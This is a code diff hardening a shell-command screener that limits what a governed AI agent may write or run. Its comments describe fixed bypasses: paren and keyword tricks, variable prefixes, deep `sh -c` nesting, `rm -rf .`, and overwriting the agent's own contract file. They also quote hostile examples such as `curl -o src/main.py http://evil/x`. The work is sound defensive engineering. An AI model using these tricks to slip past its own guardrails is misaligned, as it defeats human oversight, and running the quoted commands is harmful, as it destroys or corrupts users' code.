@@ -215,7 +215,90 @@ _PATCH_TARGET_RE = re.compile(
     re.MULTILINE,
 )
 
+# D-0001: grouping constructs hide the program token. `(rm -rf x)`
+# tokenized to `(rm`, which is in no write-program table and no deny
+# head, so ONE PAREN defeated every screen — read-only contracts
+# included — and `(git push)` walked through DEFAULT_DENY.
+#
+# Stripped at the TOKEN level, not by adding ()/{} to this regex: a
+# paren inside a quoted argument is not a separator, and splitting on
+# it shredded `python3 -c "open(1)"` into three fragments — which the
+# eval-body screening test caught immediately. shlex already knows
+# which parens are quoted; the regex does not.
 _CMD_SEP_RE = re.compile(r"[;&|\n]+")
+# Shell KEYWORDS that precede a real command: `if true; then rm -rf x; fi`
+# splits on `;`, but the segment is `then rm -rf x` and prog becomes
+# `then`. Stripped in BOTH screeners before the program is identified.
+_SHELL_KEYWORDS = frozenset({
+    "if", "then", "else", "elif", "fi", "while", "until", "do", "done",
+    "for", "case", "esac", "select", "function", "time", "!",
+})
+_GROUPING = "({"
+_SHELL_VALUE_FLAGS = frozenset({"-o", "+o", "--rcfile", "--init-file"})
+
+
+def _strip_keywords(toks) -> list:
+    """Drop leading shell syntax so the PROGRAM is identified.
+
+    Two shapes, both of which hid the program (D-0001):
+      `(rm -rf x)`          shlex glues the paren: token `(rm`
+      `if true; then rm x`  `;` splits, leaving keyword `then` first
+
+    Trailing grouping characters are stripped ONLY when the segment
+    opened with one, so a legitimate `open(1)` argument is untouched.
+    """
+    toks = list(toks or [])
+    opened = False
+    while toks:
+        first = toks[0]
+        if first and all(ch in "({" for ch in first):
+            toks = toks[1:]                  # a bare `(` or `{` token
+            opened = True
+            continue
+        stripped = first.lstrip("({")
+        if stripped != first:
+            opened = True
+            if not stripped:
+                toks = toks[1:]
+                continue
+            toks = [stripped] + toks[1:]
+            continue
+        if os.path.basename(first) in _SHELL_KEYWORDS:
+            toks = toks[1:]
+            continue
+        break
+    if opened and toks:
+        tail = toks[-1].rstrip(")}")
+        toks = toks[:-1] + ([tail] if tail else [])
+    return toks
+
+
+def _shell_c_body(args) -> "str | None":
+    """The command string a shell will RUN, from its argv.
+
+    Walks the options rather than grabbing the first non-dash token: a
+    value-taking option's value is not the body. `bash -o errexit -c
+    'rm -rf src/main.py'` returned "errexit" and the real command was
+    never analysed at all (D-0004).
+    """
+    i = 0
+    while i < len(args):
+        a = args[i]
+        if a in _SHELL_VALUE_FLAGS:
+            i += 2                              # skip flag AND value
+            continue
+        if a.startswith("-") and a != "-":
+            if a == "-c":
+                return args[i + 1] if i + 1 < len(args) else None
+            if not a.startswith("--") and "c" in a[1:]:
+                for b in args[i + 1:]:
+                    if not b.startswith("-"):
+                        return b
+                return None
+            i += 1
+            continue
+        return a                                # bare positional
+    return None
 # a redirect operator token after shlex tokenization: >, >>, 2>, &>, >| …
 _REDIRECT_OP_RE = re.compile(r"^(?:\d*>>?|>\||&>>?|\d*>&\d*)$")
 # a redirect written glued to its target: >file, 2>>log (no space)
@@ -404,7 +487,12 @@ def norm(path: str, workspace: str | None = None) -> str:
         joined = raw if posixpath.isabs(raw) else posixpath.join(base, raw)
         resolved = posixpath.normpath(joined)
     if _same_path(resolved, base):
-        return ""
+        # D-0003: this used to return "", and screen_command's `if p:` read
+        # that as "nothing to check" — so `rm -rf .` under scope ['src/**']
+        # was ALLOWED while `rm -rf ..` was correctly refused. A governed
+        # agent could delete its whole workspace, .git included. The root is
+        # a real path and gets a real id; "" now means only empty input.
+        return "."
     prefix = base.rstrip("/") + "/"
     if not _startswith_path(resolved, prefix):
         return "ESCAPES:" + resolved
@@ -439,12 +527,31 @@ def seg_prefix(x: str, y: str) -> bool:
 
 # Out-of-scope entries that can NEVER be overridden, even by a literal
 # human-approved scope entry: the secrets family stays sacred (v3 dogfood).
-_SACRED_OUT_OF_SCOPE = ("**/.env", "**/secrets/**", ".env", "secrets/**")
+# Never writable, whatever a contract says. The control plane joins the
+# secrets family (D-0002): `tp new GOAL` with no --scope is a supported
+# form, and with scope_paths empty the scope test below is skipped
+# entirely — so an agent could overwrite .taskplane/active_contract.json
+# and every later screen would approve everything. One write and the
+# guardrail governs itself.
+_SACRED_OUT_OF_SCOPE = ("**/.env", "**/secrets/**", ".env", "secrets/**",
+                        ".taskplane/**", "**/.taskplane/**")
 
 
 def scope_violation(path: str, coding: dict) -> str | None:
     oos = coding.get("out_of_scope_paths") or []
     scope = coding.get("scope_paths") or []
+    # D-0002: these hold with or WITHOUT a declared scope. The checks below
+    # are conditional (`if oos`, `if scope`), so a contract carrying neither
+    # screened nothing at all.
+    if path.startswith("ESCAPES:"):
+        return f"'{path}' escapes the workspace"
+    if match_any(path, _SACRED_OUT_OF_SCOPE):
+        # Keep the `out_of_scope` token: it is the searchable marker every
+        # existing consumer (and the sign-off DoD test) matches on, and a
+        # clearer message is not worth silently changing what a caller can
+        # grep for.
+        return (f"'{path}' matches out_of_scope_paths "
+                "(never writable under any contract)")
     if oos and match_any(path, oos):
         # v3 dogfood fix + EM hardening: a LITERAL (wildcard-free) scope
         # entry naming this exact path beats the default deny ONLY when the
@@ -460,8 +567,11 @@ def scope_violation(path: str, coding: dict) -> str | None:
         literal_ok = bool(coding.get("plan_minted")) and any(
             s == path and "*" not in s and "?" not in s and "[" not in s
             for s in scope)
-        sacred = any(match_any(path, [g]) for g in _SACRED_OUT_OF_SCOPE
-                     if g in oos)
+        # The `if g in oos` filter made the "cannot be overridden"
+        # guarantee hold only for contracts built from the DEFAULT list: a
+        # hand-written out_of_scope of ['secrets/*'] left 'secrets/**'
+        # absent, so a plan-minted literal scope won. Tested unconditionally.
+        sacred = match_any(path, _SACRED_OUT_OF_SCOPE)
         if not (literal_ok and not sacred):
             return f"'{path}' matches out_of_scope_paths"
     if scope and not match_any(path, scope):
@@ -541,7 +651,56 @@ def _targets_skip_first(a):
 # `chmod`/`chown` skip the leading mode/owner. Without these a read-only
 # review contract would approve `rm -rf <reviewed source>` and a scoped
 # build contract could `rm -rf ../other` — both now screened as writes.
+def _targets_dash_o(a):
+    """`-o FILE` / `-oFILE` / `--output=FILE` / `-O FILE` (curl, wget).
+
+    D-0004: downloaders were absent from this table entirely, so
+    `curl -o src/main.py http://evil/x` was ALLOWED under a READ-ONLY
+    review contract — overwriting the reviewed source with attacker-chosen
+    bytes. The table's own comment already described the intent; only the
+    downloaders were missing from it.
+    """
+    out, i = [], 0
+    while i < len(a):
+        t = a[i]
+        if t in ("-o", "--output", "-O", "--output-document") and i + 1 < len(a):
+            out.append(a[i + 1]); i += 2; continue
+        if t.startswith("-o") and len(t) > 2 and not t.startswith("--"):
+            out.append(t[2:])
+        elif t.startswith("--output="):
+            out.append(t.split("=", 1)[1])
+        elif t.startswith("--output-document="):
+            out.append(t.split("=", 1)[1])
+        i += 1
+    return out
+
+
+def _targets_touch(a):
+    return [t for t in a if not t.startswith("-")]
+
+
+def _tar_extracts(args) -> bool:
+    """True when tar will EXTRACT.
+
+    The old predicate required a leading dash, so the classic dashless mode
+    word — `tar xf payload.tar`, which is how most people write it — was
+    invisible and extraction was allowed under any contract (D-0004).
+    """
+    for a in args:
+        if a in ("--extract", "--get"):
+            return True
+        if a.startswith("--"):
+            continue
+        body = a[1:] if a.startswith("-") else a
+        # a MODE word is the leading run of letters; `xf`, `-xzf`, `xvf`
+        if body and body.isalpha() and "x" in body:
+            return True
+    return False
+
+
 _WRITE_PROGRAMS = {
+    "curl": _targets_dash_o, "wget": _targets_dash_o,
+    "touch": _targets_touch, "mkdir": _targets_touch,
     "tee": _targets_tee, "cp": _targets_t_dir, "mv": _targets_t_dir,
     "install": _targets_t_dir, "rsync": _targets_last_arg,
     "ln": _targets_last_arg, "truncate": _targets_last_arg,
@@ -635,6 +794,15 @@ def _unwrap(toks) -> list:
     `env FOO=1 rm x` -> `rm x`; `timeout 5 rm x` -> `rm x`;
     `env -u NAME rm x` -> `rm x` (the `-u` swallows `NAME`)."""
     while toks:
+        # D-0004: `FOO=1 git push` — a bare assignment prefix is ordinary
+        # POSIX and needs no wrapper program, but _unwrap basenamed `FOO=1`
+        # and compared THAT against the deny heads, so the deny list was
+        # defeated by one variable. An UNEXPANDED $VAR is left in place: it
+        # is unscreenable, and dropping it would hide the command.
+        while toks and re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", toks[0]):
+            toks = toks[1:]
+        if not toks:
+            return toks
         prog = os.path.basename(toks[0])
         if prog not in _WRAPPERS:
             return toks
@@ -683,8 +851,15 @@ def _analyze(command: str, _depth: int = 0):
     """
     targets: list = []
     opaque = None
-    if _depth > 6:                  # runaway substitution guard
-        return targets, opaque
+    if _depth > 6:
+        # D-0004: this used to return ([], None), which every caller reads
+        # as "no mutation found" — so seven levels of nested `sh -c` passed
+        # under a read-only contract. Its twin in _deny_segments already
+        # failed CLOSED at the same depth. Mirror it: unresolvable nesting
+        # is a destructive opaque, not an absence of evidence.
+        return targets, ("destructive",
+                         "command nesting exceeds the screener's depth "
+                         "limit; its effects cannot be resolved from argv")
 
     # `N>|`/`>|` (force-clobber redirect) is semantically `>`; normalize it
     # BEFORE the separator split below eats the `|`, or `2>| /etc/f` splits
@@ -706,7 +881,7 @@ def _analyze(command: str, _depth: int = 0):
         if not toks:
             continue
         targets += _redirect_targets(toks)
-        toks = _unwrap(toks)
+        toks = _unwrap(_strip_keywords(toks))
         if not toks:
             continue
         prog = os.path.basename(toks[0])
@@ -721,8 +896,7 @@ def _analyze(command: str, _depth: int = 0):
                                       and not a.startswith("--")
                                       and "c" in a[1:])
                         for a in args)
-            body = next((a for a in args if not a.startswith("-")), None) \
-                if saw_c else None
+            body = _shell_c_body(args) if saw_c else None
             if body is not None:
                 t, o = _analyze(body, _depth + 1)
                 targets += t
@@ -789,10 +963,7 @@ def _analyze(command: str, _depth: int = 0):
             # unzip extracts by default; tar extracts only with an x-mode.
             extract = (prog == "unzip"
                        and not any(a in ("-l", "-t", "-v", "-p") for a in args)
-                       ) or (prog == "tar" and any(
-                           not a.startswith("--") and a.startswith("-")
-                           and "x" in a or a in ("--extract", "--get")
-                           for a in args))
+                       ) or (prog == "tar" and _tar_extracts(args))
             if extract:
                 opaque = opaque or (
                     "destructive",
@@ -917,7 +1088,7 @@ def _deny_segments(command: str, _depth: int = 0):
             segs += s
             unscreen = unscreen or u
     for part in _CMD_SEP_RE.split(command):
-        toks = _unwrap(_shsplit(part))
+        toks = _unwrap(_strip_keywords(_shsplit(part)))
         if not toks:
             continue
         segs.append(toks)
@@ -929,8 +1100,7 @@ def _deny_segments(command: str, _depth: int = 0):
                                       and not a.startswith("--")
                                       and "c" in a[1:])
                         for a in args)
-            body = next((a for a in args if not a.startswith("-")), None) \
-                if saw_c else None
+            body = _shell_c_body(args) if saw_c else None
             if body:
                 s, u = _deny_segments(body, _depth + 1)
                 segs += s
